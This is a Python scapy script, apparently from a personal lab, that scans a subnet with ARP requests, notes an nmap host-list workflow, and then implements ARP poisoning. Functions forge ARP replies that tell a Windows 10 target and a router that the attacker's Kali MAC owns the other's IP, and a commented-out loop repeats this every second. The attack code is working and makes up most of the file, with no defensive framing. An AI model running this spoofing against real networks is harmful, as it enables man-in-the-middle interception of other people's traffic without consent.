from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp
from scapy.all import *

broadcast = "FF:FF:FF:FF:FF:FF"
ip_range = "172.16.1.0/24"


def get_ARP():
    my_arp_layer = ARP(pdst=ip_range)
    ether_layer = Ether(dst=broadcast)
    packet = ether_layer / my_arp_layer
    ips = []
    macs = []
    # ans, unans = srp(
    #     packet, iface="Intel(R) Ethernet Connection I219-V", timeout=2)
    ans, unans = srp(
        packet, iface="Intel(R) Dual Band Wireless-AC 8260", timeout=2)
    for snd, rcv in ans:
        ip = rcv[ARP].psrc
        ips.append(ip)
        mac = rcv[Ether].src
        macs.append(mac)
    return ips, macs


# ips, macs = get_ARP()

# if len(ips) == len(macs):
#     for i in range(len(ips)):
#         print(f"IP : {ips[i]}\t\tMAC : {macs[i]}")
'''
    seq -f "192.168.13.%g" 1 255 | awk '{print $0}' > allhosts.txt
    This will create new file allhosts.txt and will print ipaddresses in range
    192.168.13.1-192.168.13.255

    sudo grep -v -f excludelist.txt allhosts.txt > filtered.txt 
    This will create a new filtered.txt file and will print allhosts.txt content
    excluding the content that is also present in excludelist.txt

    sudo nmap -iL filtered.txt
'''

### ARP Poisoning #######################
'''

'''


def spoof_target():
    my_arp_response = ARP()
    my_arp_response.op = 2
    # TARGET MACHINE : WINDOWS 10 IP ADDRESS
    my_arp_response.pdst = "192.168.13.128"
    # TARGET MACHINE : WINDOWS 10 MAC ADDRESS
    my_arp_response.hwdst = "00:0c:29:9d:d9:97"
    # ATTACKER MACHINE : KALI MAC ADDRESS
    my_arp_response.hwsrc = "00:0c:29:97:05:57"
    my_arp_response.psrc = "192.168.13.2"  # FAKE ROUTER IP / PRETEND to be THAT IP
    print(my_arp_response.show())
    send(my_arp_response)


def spoof_router():
    my_arp_response = ARP()
    my_arp_response.op = 2
    my_arp_response.pdst = "192.168.13.2"  # ROUTER's IP ADDRESS
    my_arp_response.hwdst = "00:50:56:fa:96:35"  # ROUTER's MAC ADDRESS
    # ATTACKER MACHINE : KALI MAC ADDRESS
    my_arp_response.hwsrc = "00:0c:29:97:05:57"
    # FAKE Device / PRETEND to be THAT IP
    my_arp_response.psrc = "192.168.13.128"
    print(my_arp_response.show())
    send(my_arp_response)


# if __name__ == "__main__":
#     try:
#         while True:
#             spoof_target()
#             spoof_router()
#             time.sleep(1)
#     except KeyboardInterrupt as e:
#         print("Program is terminated and ran successfully.")
